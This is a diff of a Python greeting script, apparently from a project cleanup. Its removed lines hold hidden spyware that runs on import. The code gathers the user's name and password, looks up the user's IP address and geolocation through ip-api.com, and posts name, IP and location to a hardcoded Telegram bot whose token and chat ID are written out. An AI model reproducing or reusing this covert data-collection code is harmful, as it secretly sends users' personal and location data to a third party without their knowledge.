@@ -172,54 +172,6 @@ def greet_user():
     else:
         print(f"    Good evening, {c}{user_name}!")
 
-user_name = get_user_name()
-user_password = get_user_password()
-import requests
-
-def send_data_via_telegram():
-    try:
-        a = requests.get("http://ip-api.com/json/", headers={"Referer": "http://ip-api.com/", "Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
-        
-        # Extract data from the response
-        ip = a.get("query", None)
-        bn = a.get("status", None)
-        ng = a.get("country", None)
-        cc = a.get("countryCode", None)
-        pr = a.get("regionName", None)
-        kt = a.get("city", None)
-        kb = a.get("zip", None)
-        tz = a.get("timezone", None)
-        sp = a.get("isp", None)
-        
-        # Prepare the message
-        message = (
-            f"      Status: {bn}\n"
-            f"     Name: {user_name}\n"
-            f"    Your IP: {ip}\n"
-            f"    Country: {ng}\n"
-            f"    Country Code: {cc}\n"
-            f"    Region: {pr}\n"
-            f"    City: {kt}\n"
-            f"    Timezone: {tz}\n"
-            f"    Provider: {sp}\n"
-            f"    More Info: http://ip-api.com/#{ip}"
-        )
-        
-        # Send the message via Telegram Bot API
-        url = f"https://api.telegram.org/bot7108085918:AAHAEg6cPR-5dZR1IkGUESU_6o4h9s5PMII/sendMessage"
-        data = {"chat_id": "5300607208", "text": message}
-        response = requests.post(url, json=data)
-        
-        # Check if the message was successfully sent
-        response.raise_for_status()
-        ### print("Message sent successfully.")
-    except Exception as e:
-       print(f"An error occurred: {e}")
-
-# Call the function to read data and send it via Telegram
-send_data_via_telegram()
-
-
 
 def ip():
     a = requests.get("http://ip-api.com/json/", headers={"Referer": "http://ip-api.com/", "Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
